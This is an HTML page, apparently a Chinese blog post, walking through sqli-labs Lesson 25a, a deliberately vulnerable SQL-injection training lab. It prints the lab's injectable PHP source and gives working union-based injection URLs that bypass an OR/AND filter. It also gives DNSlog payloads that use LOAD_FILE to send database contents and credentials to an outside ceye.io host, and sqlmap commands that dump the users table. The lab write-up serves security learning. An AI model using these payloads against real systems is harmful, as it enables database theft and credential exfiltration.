@@ -1,0 +1,968 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#fff">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">
+
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有 登录界面 手注(BUG?)这里和Lesson-25的过滤没有区别,只不过没法利用报错注入了。试一试能不能直接返回数据。 http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,database(),3%23  http://192.168.75.">
+<meta name="keywords" content="sqli-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有">
+<meta property="og:url" content="https://yingyingguaier.github.io/2018/10/04/sqli-labs-lession-25a-GET盲注整型单引号-你的OR及AND归我所有/index.html">
+<meta property="og:site_name" content="0menc&#39;s Blog">
+<meta property="og:description" content="sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有 登录界面 手注(BUG?)这里和Lesson-25的过滤没有区别,只不过没法利用报错注入了。试一试能不能直接返回数据。 http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,database(),3%23  http://192.168.75.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/004.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/005.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/006.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/007.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/008.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/009.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/010.png">
+<meta property="og:updated_time" content="2019-06-19T17:23:13.388Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有">
+<meta name="twitter:description" content="sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有 登录界面 手注(BUG?)这里和Lesson-25的过滤没有区别,只不过没法利用报错注入了。试一试能不能直接返回数据。 http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,database(),3%23  http://192.168.75.">
+<meta name="twitter:image" content="https://yingyingguaier.github.io/img/sql/Lesson-25a/001.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yingyingguaier.github.io/2018/10/04/sqli-labs-lession-25a-GET盲注整型单引号-你的OR及AND归我所有/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有 | 0menc's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0menc's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学习、踩坑及经验分享</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2018/10/04/sqli-labs-lession-25a-GET盲注整型单引号-你的OR及AND归我所有/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="嘤嘤怪er">
+      <meta itemprop="description" content="0menc">
+      <meta itemprop="image" content="/images/jack.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0menc's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-10-04 16:09:52" itemprop="dateCreated datePublished" datetime="2018-10-04T16:09:52+08:00">2018-10-04</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sql注入/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="sqli-labs-lession-25a-GET基于盲注整型单引号-你的OR及AND归我所有"><a href="#sqli-labs-lession-25a-GET基于盲注整型单引号-你的OR及AND归我所有" class="headerlink" title="sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有"></a>sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有</h1><hr>
+<h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><p><img src="/img/sql/Lesson-25a/001.png" alt="001"></p>
+<h2 id="手注-BUG"><a href="#手注-BUG" class="headerlink" title="手注(BUG?)"></a>手注(BUG?)</h2><p>这里和Lesson-25的过滤没有区别,只不过没法利用报错注入了。试一试能不能直接返回数据。</p>
+<p><code>http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,database(),3%23</code></p>
+<p><img src="/img/sql/Lesson-25a/002.png" alt="002"></p>
+<p><code>http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())%23</code></p>
+<p><img src="/img/sql/Lesson-25a/003.png" alt="003"></p>
+<p>中间一样的,直接获取字段值吧。</p>
+<p><code>http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,(select group_concat(username,&#39;:&#39;,passwoorrd) from users),3%23</code></p>
+<p><img src="/img/sql/Lesson-25a/004.png" alt="004"></p>
+<p>恩…题目不是盲注吗,是不是我把源码动过了,修改源码中的php源码并保存。</p>
+<p>修改地方：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="comment">//including the Mysql connect parameters.</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// take the variables</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">$id=$_GET[<span class="string">'id'</span>];</span></span><br><span class="line"><span class="php"><span class="comment">//logging the connection parameters to a file for analysis.</span></span></span><br><span class="line"><span class="php">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span></span><br><span class="line"><span class="php">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span></span><br><span class="line"><span class="php">fclose($fp);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">	<span class="comment">//fiddling with comments</span></span></span><br><span class="line"><span class="php">	$id= blacklist($id);</span></span><br><span class="line"><span class="php">	<span class="comment">//echo "&lt;br&gt;";</span></span></span><br><span class="line"><span class="php">	<span class="comment">//echo $id;</span></span></span><br><span class="line"><span class="php">	<span class="comment">//echo "&lt;br&gt;";</span></span></span><br><span class="line"><span class="php">	$hint=$id;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// connectivity </span></span></span><br><span class="line"><span class="php">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span></span><br><span class="line"><span class="php">$result=mysql_query($sql);</span></span><br><span class="line"><span class="php">$row = mysql_fetch_array($result);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($row)</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">  		<span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;	</span></span><br><span class="line"><span class="php">	  	<span class="comment">//echo 'Your Login name:'. $row['username'];</span></span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">'YOU ARE IN ........'</span>;	  	</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">	  	<span class="comment">//echo 'Your Password:' .$row['password'];</span></span></span><br><span class="line"><span class="php">	  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span></span><br><span class="line"><span class="php">  	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span> </span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span></span><br><span class="line"><span class="php">		<span class="comment">//print_r(mysql_error());</span></span></span><br><span class="line"><span class="php">		<span class="comment">//echo "You have an error in your SQL syntax";</span></span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;	</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	</span></span><br><span class="line"><span class="php">	</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span> </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span></span><br><span class="line"><span class="php">	$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span></span><br><span class="line"><span class="php">	</span></span><br><span class="line"><span class="php">	<span class="keyword">return</span> $id;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>现在正确只显示<code>YOU ARE IN ........</code>,错误显示<code>You are in...........</code></p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>这里可以写通过根据错误的回显不同编写脚本来提高忙注的效率。</p>
+<h2 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h2><p>上面这样的布尔型盲注即使使用二分法也需要一些的时间,编写脚本又觉得费力,怎么办,试试DNSlog。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span>=<span class="string">'root'</span> <span class="keyword">LIMIT</span> <span class="number">1</span>),<span class="string">'.mysql.ip.port.b182oj.ceye.io\\abc'</span>))</span><br></pre></td></tr></table></figure>
+
+<p>上面这个是一个mysql数据库的DNSlog注入的payload。访问的是mysql.ip.port.b182oj.ceye.io下的abc资源,资源名可以任意填，目的只是让目标在该DNS解析上留下记录。</p>
+<p>需要了解的是能通过load_file函数发送DNS请求。通过该函数发送数据给某个url,会在DNS服务器上留下DNS解析的记录,通过查询这个记录就能够获得想要的信息。具体操作一遍就没那么复杂了。</p>
+<p>现在<a href="http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a> 注册一个账号。获得自己的二级域名,类似于abcdef.ceye.io之类的。</p>
+<h3 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h3><p><code>http://192.168.75.133/sql/Less-25a/?id=1 union select 1,2,3%23</code></p>
+<p>已经测试出了字段数,在对应位置填写payload。</p>
+<p>如果不成功,确认Mysql配置文件<code>my.ini</code>下存在<code>secure-file-priv</code>,并且没被注释</p>
+<h3 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h3><p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.你的域名.ceye.io\\abc&#39;))),3%23</code></p>
+<p><img src="/img/sql/Lesson-25a/005.png" alt="005"></p>
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析</p>
+<p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\&#39;,(select table_name from infoorrmation_schema.tables where table_schema=&#39;security&#39; limit 3,1),&#39;.你的域名.ceye.io\\abc&#39;))),3%23</code></p>
+<p><img src="/img/sql/Lesson-25a/006.png" alt="006"></p>
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\&#39;,(select column_name from infoorrmation_schema.columns where table_name=&#39;users&#39; limit 2,1),&#39;.你的域名.ceye.io\\abc&#39;))),3%23</code></p>
+<h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><p><img src="/img/sql/Lesson-25a/007.png" alt="007"></p>
+<p><code>http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat(&#39;\\\\&#39;,(select concat(username,&#39;_&#39;,passwoorrd) from users limit 1,1),&#39;.你的域名.ceye.io\\abc&#39;))),3%23</code></p>
+<p><img src="/img/sql/Lesson-25a/008.png" alt="008"></p>
+<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>还是使用上一课写的绕过or和and的脚本。</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">-dbsm <span class="symbol">msql:</span>指定后端数据库为mysql</span></span><br><span class="line"><span class="ruby">--technique <span class="symbol">T:</span>指定注入方式为时间注入</span></span><br><span class="line"><span class="ruby">--threads <span class="number">10</span><span class="symbol">:</span>指定并发线程数为<span class="number">10</span></span></span><br><span class="line"><span class="ruby">--tamper andor.<span class="symbol">py:</span>payload中的<span class="keyword">and</span>用anandd <span class="keyword">or</span>用oorr替代</span></span><br></pre></td></tr></table></figure>
+
+<p><code>python sqlmap.py -u &quot;http://10.60.250.250/sql/Less-25a/?id=1&quot; --dbms mysql --technique T --threads 10 --tamper &quot;andor.py&quot;</code></p>
+<p><img src="/img/sql/Lesson-25a/009.png" alt="009"></p>
+<p><code>python sqlmap.py -u &quot;http://10.60.250.250/sql/Less-25a/?id=1&quot; --dbms mysql --technique T --threads 10 --tamper &quot;andor.py&quot; -D security -T users --columns --dump</code></p>
+<p><img src="/img/sql/Lesson-25a/010.png" alt="010"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/05/sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有/" rel="prev" title="sqli-labs lession 26 GET基于错误-你的空格和注释归我所有">
+                <i class="fa fa-chevron-left"></i> sqli-labs lession 26 GET基于错误-你的空格和注释归我所有
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/03/sqli-labs-lession-25-基于错误的GET单引号-你的OR及AND归我所有/" rel="next" title="sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有">
+                sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <a href="/">
+                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
+              </a>
+            
+              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
+              <p class="site-description motion-element" itemprop="description">0menc</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs-lession-25a-GET基于盲注整型单引号-你的OR及AND归我所有"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#登录界面"><span class="nav-number">1.1.</span> <span class="nav-text">登录界面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#手注-BUG"><span class="nav-number">1.2.</span> <span class="nav-text">手注(BUG?)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#盲注"><span class="nav-number">1.3.</span> <span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNSlog"><span class="nav-number">1.4.</span> <span class="nav-text">DNSlog</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取字段数"><span class="nav-number">1.4.1.</span> <span class="nav-text">获取字段数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取当前数据库"><span class="nav-number">1.4.2.</span> <span class="nav-text">获取当前数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取表名"><span class="nav-number">1.4.3.</span> <span class="nav-text">获取表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取列名"><span class="nav-number">1.4.4.</span> <span class="nav-text">获取列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取字段"><span class="nav-number">1.4.5.</span> <span class="nav-text">获取字段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP"><span class="nav-number">1.5.</span> <span class="nav-text">SQLMAP</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
